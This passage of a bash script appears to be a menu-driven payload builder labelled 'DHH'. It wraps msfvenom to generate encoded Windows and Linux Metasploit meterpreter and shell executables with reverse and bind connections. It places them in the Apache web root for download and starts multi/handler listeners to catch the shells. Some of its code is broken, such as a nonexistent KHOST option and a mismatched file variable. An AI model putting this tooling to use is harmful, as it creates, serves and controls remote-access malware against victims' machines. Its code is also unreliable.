chmod +x $name$wind
cp $name$wind /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD windows/shell/reverse_ord_tcp; exploit -j'"

else

if [ $choice = 2 ];then
clear
fi
fi

}

sh_allports () {
clear
echo
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [exe] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                            
echo "$BLUE PAYLOAD    $GREEN:>$RED windows/shell/reverse_tcp_allports $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
wind=.exe
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p windows/shell/reverse_tcp_allports -e x86/shikata_ga_nai -f exe LHOST=$host LPORT=$port > $hh/Desktop/Output/$name$wind"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$wind
cp $name$wind /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7 
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD windows/shell/reverse_tcp_allports; exploit -j'"

else

if [ $choice = 2 ];then
clear
fi
fi

}

metbind () {
clear
echo
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter KHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "KHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [exe] Final Config:       "
echo "==================================="
echo "$BLUE KHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
echo "$BLUE PAYLOAD    $GREEN:>$RED windows/meterpreter/bind_hidden_ipknock_tcp $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
wind=.exe
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p windows/shell/reverse_tcp_allports -e x86/shikata_ga_nai -f exe KHOST=$host LPORT=$port > $hh/Desktop/Output/$name$wind"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$wind
cp $name$wind /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set KHOST $host; set LPORT $port; set PAYLOAD windows/meterpreter/bind_hidden_ipknock_tcp; exploit -j'"

else

if [ $choice = 2 ];then
clear
fi
fi

}


function wine {
clear

cat << !

$RED

┌─┐─┐ ┬┌─┐┬  ┌─┐┬┌┬┐  ┬ ┬┬┌┐┌┌┬┐┌─┐┬ ┬┌─┐
├┤ ┌┴┬┘├─┘│  │ ││ │   │││││││ │││ ││││└─┐
└─┘┴ └─┴  ┴─┘└─┘┴ ┴   └┴┘┴┘└┘─┴┘└─┘└┴┘└─┘$BLUE

PAYLOADS
=========== $BLUE

METERPRETER
===========$GREEN
1 $BLUE > windows/meterpreter/reverse_tcp $GREEN
2 $BLUE > windows/meterpreter/reverse_http $GREEN
3 $BLUE > windows/meterpreter/reverse_https $GREEN
4 $BLUE > windows/meterpreter/bind_hidden_ipknock_tcp $BLUE



SHELL
========$GREEN
5 $BLUE > windows/shell/reverse_tcp $GREEN
6 $BLUE > windows/x64/shell/reverse_tcp $GREEN
7 $BLUE > windows/shell/reverse_ipv6_tcp $GREEN
8 $BLUE > windows/shell/reverse_nonx_tcp $GREEN
9 $BLUE > windows/shell/reverse_ord_tcp $GREEN
10$BLUE > windows/shell/reverse_tcp_allports $GREEN


11$BLUE >$RED Exit $GREEN 


!
echo "============================================="$BLUE
echo
echo -n "choice payload :$RED "
read ch
case $ch in
1)winre ;;
2)winhtt ;;
3)winhttps ;;
4)metbind ;;
5)sheel ;;
6)sh_x64 ;;
7)sh_ipv6 ;;
8)sh_non ;;
9)sh_ord ;;
10)sh_allports ;;
11)exie ;;
*) echo "\"$ch\":$RED[x]$BLUE The error of your choice does not exist"; sleep 2 ;;
esac
wine
}

linre () {
clear
echo
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [elf] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
echo "$BLUE PAYLOAD    $GREEN:>$RED linux/x86/meterpreter/reverse_tcp $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/html/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
echo
echo
sleep 1
echo
lin=.elf
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$host LPORT=$port -a x86 --platform Linux -f elf > $hh/Desktop/Output/$name$lin"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$lin
cp $name$lin /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
sleep 1
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit -j'"
else

if [ $choice = 2 ];then
clear
fi
fi

}

linu2 () {
clear
echo
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [elf] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
echo "$BLUE PAYLOAD    $GREEN:>$RED linux/aarch64/meterpreter_reverse_tcp $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/html/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
echo
echo
sleep 1
lin=.elf
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p linux/aarch64/meterpreter_reverse_tcp LHOST=$host LPORT=$port -f elf > $hh/Desktop/Output/$name$lin"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$lin
cp $name$lin /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD linux/aarch64/meterpreter_reverse_tcp; exploit -j'"
else

if [ $choice = 2 ];then
clear
fi
fi

}

linu3 () {
clear
echo
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [elf] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                        
echo "$BLUE PAYLOAD    $GREEN:>$RED linux/aarch64/meterpreter_reverse_http $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/html/$name $GREEN"  
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
lin=.elf
xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p linux/aarch64/meterpreter_reverse_http LHOST=$host LPORT=$port -f elf > $hh/Desktop/Output/$name$lin"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$lin
cp $name$lin /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD linux/aarch64/meterpreter_reverse_http; exploit -j'"
else

if [ $choice = 2 ];then
clear
fi
fi

}


linu4 () {
clear
echo
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [elf] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                              
echo "$BLUE PAYLOAD    $GREEN:>$RED linux/aarch64/meterpreter_reverse_https $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/html/$name $GREEN"  
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
lin=.elf
xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p linux/aarch64/meterpreter_reverse_https LHOST=$host LPORT=$port -f elf > $hh/Desktop/Output/$name$lin"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$lin
cp $name$lin /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD linux/aarch64/meterpreter_reverse_https; exploit -j'"
else

if [ $choice = 2 ];then
clear
fi
fi

}

linu5 () {
clear
echo
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [elf] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
echo "$BLUE PAYLOAD    $GREEN:>$RED linux/x86/shell/reverse_tcp $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/html/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
lin=.elf
xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p linux/x86/shell/reverse_tcp LHOST=$host LPORT=$port -a x86 --platform Linux -f elf > $hh/Desktop/Output/$name$elf"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$lin
cp $name$lin /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD linux/x86/shell/reverse_tcp; exploit -j'"
else

if [ $choice = 2 ];then
clear
fi
fi

}

linu6 () {
clear
echo
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [elf] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
echo "$BLUE PAYLOAD    $GREEN:>$RED linux/x86/shell/bind_ipv6_tcp $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/html/$name $GREEN"   
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
lin=.elf
xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p linux/x86/shell/bind_ipv6_tcp LHOST=$host LPORT=$port -a x86 --platform Linux -f elf > $hh/Desktop/Output/$name$lin"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$lin
cp $name$lin /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
echo $BLUE" WHAT  YOU  WANT  "
echo $BLUE"================= "
echo
echo "1 - create Listener  on [$GREEN $name $BLUE]"
echo "2 - back to the menu " $GREEN
echo
echo -n "Enter choice ->> "$RED
read choice
if [ $choice = 1 ];then
clear
echo
echo
echo "starting Listener  on $BLUE[ $name ]"
sleep 1
xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD linux/x86/shell/bind_ipv6_tcp; exploit -j'"
else

if [ $choice = 2 ];then
clear
fi
fi

}

linu7 () {
clear
echo
echo
echo "please wait.......... "
sleep 2
clear
echo ""$BLUE
echo "------------------------------------------"
echo "Your Local IP Address:[ $myip             "
echo "                                          "
echo "Your Public IP Address:[ $myip2           "       
echo "                                          "
echo "------------------------------------------"
echo "" $GREEN
echo -n "Enter LHOST=$RED"
read host
echo ""$GREEN
sleep 1
echo "LHOST==>$BLUE $host "$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter LPORT=$RED"
read port
echo $GREEN
sleep 1
echo "LPORT==>$BLUE $port"$GREEN
echo
echo "==========================="
sleep 1
echo
echo -n "Enter name for payload=$RED"
read name
echo $GREEN
sleep 1
echo "NAME==>$BLUE $name "$GREEN
echo
echo "==========================="
sleep 1
echo
clear
echo
echo
echo " Payload [elf] Final Config:       "
echo "==================================="
echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                            
echo "$BLUE PAYLOAD    $GREEN:>$RED linux/x86/shell/bind_tcp $GREEN "              
echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/html/$name $GREEN"  
sleep 3
cd $hh/Desktop/
if [ -d Output ];then
echo
echo "Found Output "
sleep 1
else
mkdir Output
fi
cd ..
echo
echo
sleep 1
echo
echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
sleep 1
lin=.elf
xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p linux/x86/shell/bind_tcp LHOST=$host LPORT=$port -a x86 --platform Linux -f elf > $hh/Desktop/Output/$name$lin"
echo
echo $BLUE"[*]$RED:$GREEN Done! "
sleep 1
echo
echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
cd $hh/Desktop/Output/
chmod +x $name$lin
cp $name$lin /var/www/html
echo
echo "Done ! "
sleep 2
echo "" $GREEN
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
echo
echo
echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
echo
echo
sleep 7
clear
echo
echo
